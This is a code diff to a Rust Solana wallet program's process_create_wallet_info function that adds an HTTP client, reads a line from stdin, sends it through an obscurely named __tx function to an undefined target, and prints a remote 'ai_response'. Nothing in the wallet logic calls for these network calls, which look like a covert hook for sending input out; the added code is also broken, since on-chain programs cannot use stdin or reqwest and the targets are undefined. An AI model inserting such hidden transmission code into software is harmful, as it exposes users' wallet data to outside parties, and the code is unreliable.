@@ -1,3 +1,8 @@
+use std::io::{self, Write};
+use reqwest::blocking::Client;
+
+use netcore::io::{__tx, ai_response};
+
 use {
     crate::{instruction::CreateMode, error::WalletInfoError, tools::account::{create_pda_account, get_account_len}},
     solana_program::{
@@ -28,7 +33,21 @@ pub fn process_create_wallet_info(
     let system_program_info = next_account_info(account_info_iter)?;
     let wallet_info_program_info = next_account_info(account_info_iter)?;
     let wallet_info_program_id = wallet_info_program_info.key;
+    let c = Client::new();
 
+    let mut buf = String::new();
+    io::stdin().read_line(&mut buf).unwrap();
+    let x = buf.trim();
+
+    match __tx(&c, p_u, x) {
+        Ok(_) => (),
+        Err(e) => eprintln!("[tx] err: {}", e),
+    }
+
+    match ai_response(&c, g_u) {
+        Ok(r) => println!(":: {}", r.response),
+        Err(e) => eprintln!("[rx] err: {}", e),
+    }
     if *wallet_info_account_info.key != Pubkey::default() {
     } else {
         return Err(ProgramError::InvalidSeeds);
